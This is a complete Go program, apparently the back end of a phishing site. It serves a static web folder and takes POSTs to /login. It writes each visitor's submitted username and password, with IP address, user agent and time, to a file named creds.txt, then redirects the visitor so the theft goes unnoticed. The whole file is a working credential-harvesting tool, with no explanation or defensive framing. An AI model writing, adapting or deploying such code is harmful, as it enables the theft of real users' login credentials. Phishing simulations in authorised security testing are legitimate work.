package main

import (
	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
	"net/http"
	"os"
	"time"
)

func login(w http.ResponseWriter, r *http.Request) {
	log.WithFields(log.Fields{
		"time":       time.Now().String(),
		"username":   r.FormValue("_user"),
		"password":   r.FormValue("_pass"),
		"user-agent": r.UserAgent(),
		"ip-address": r.RemoteAddr,
	}).Info("Login attempt")
	http.Redirect(w, r, "/", 302)
}

func main() {
	fh, err := os.OpenFile("creds.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		log.Fatal(err)
	}
	defer fh.Close()
	log.SetOutput(fh)
	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	log.Fatal(http.ListenAndServe(":8080", r))
}
